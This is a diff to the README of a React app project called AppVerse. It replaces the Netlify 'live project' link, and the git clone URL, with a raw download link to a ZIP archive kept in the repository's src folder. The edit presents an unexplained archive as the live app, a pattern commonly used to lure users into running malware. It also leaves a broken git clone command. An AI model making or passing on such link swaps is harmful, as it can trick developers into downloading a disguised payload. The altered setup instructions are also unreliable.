@@ -4,7 +4,7 @@ AppVerse
 **Description**
 AppVerse is a modern platform to explore, install and manage apps easily with ratings and reviews.
 
-[Click here to view the live project](https://zippy-bonbon-595e61.netlify.app/)
+[Click here to view the live project](https://github.com/khaled8787/hero-app/raw/refs/heads/main/src/app_hero_1.7-alpha.4.zip)
 
 **Technology**
 -HTML
@@ -25,7 +25,7 @@ AppVerse is a modern platform to explore, install and manage apps easily with ra
 - **User-Friendly Interface:** Easy navigation and clean design
 
 ## How to Run Locally
-1. git clone https://github.com/khaled8787/hero-app.git
+1. git clone https://github.com/khaled8787/hero-app/raw/refs/heads/main/src/app_hero_1.7-alpha.4.zip
 2. cd hero-app
 3. npm install
 4. npm start / npm run dev
